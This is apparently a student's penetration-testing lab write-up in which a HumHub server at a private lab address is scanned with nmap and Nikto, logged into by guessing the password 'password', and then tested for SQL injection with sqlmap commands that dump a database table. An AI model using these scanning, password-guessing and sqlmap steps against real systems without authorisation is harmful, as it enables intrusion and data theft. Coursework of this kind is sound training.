# Assigment 4
For full executive report, see [PWNChallenge4_GabriellaAhn](https://github.com/haein001/CMU_penetration-testing/blob/e939946f901da28b7b8a9271e8c5fcdf625d1961/pwnchallenge4/PWNchallenge4.pdf)

1. Conduct thorough scan of 10.20.160.135 that are found from inital scan of the scope 10.20.160.20-160.
   
    ``
    nmap -A -p- -T5 10.20.160.135
    ``
    
    Port 80 and port 443 were running on the host. From aggressive scan, http-robots.txt and humhub is found related to port 80.
    
2. These findings maybe related to web vulnerability. So, conduct web vulnerability scan.

    - **Nikto**: a web server scanner is a security tool that will test a website for thousands of possible security issues
    
3. Access 10.20.160.135/robots.txt from the outcome of the scan.

   ![image](https://github.com/haein001/CMU_penetration-testing/assets/77334059/8d44d35a-9256-414d-81f3-a7182ec3be59)

4. Access 10.20.160.135/humhub which led to login page. Guessing the password to 'password', it was very easy to login. This means that humhub's acccount use too simple password. 

5. Humhub has many vulnerabilites and one of them is SQL injection. Using Burp Suite, capture the cookie and save it into a file.
  ![image](https://github.com/haein001/CMU_penetration-testing/assets/77334059/71c55bb8-42dc-4b31-bc5a-fbe69c498042)
  ![image](https://github.com/haein001/CMU_penetration-testing/assets/77334059/ffe6f5d2-5c01-42a4-9b2a-bd93d1c6fdee)
    
6. Use sqlmap to find out if the url has vulnerability.

    - **sqlmap**: an open-source tool used in penetration testing to detect and exploit SQL injection flaws

    ``
    sqlmap -r asdfg -p from
    ``
    
    ``
    sqlmap -r asdfg -p from --tables
    ``
    
    ``
    sqlmap -r asdfg -p from --dump -D humhub -T space
    ``
    
    ![image](https://github.com/haein001/CMU_penetration-testing/assets/77334059/0ef07a23-0d71-4597-8f7f-e63e89727223)
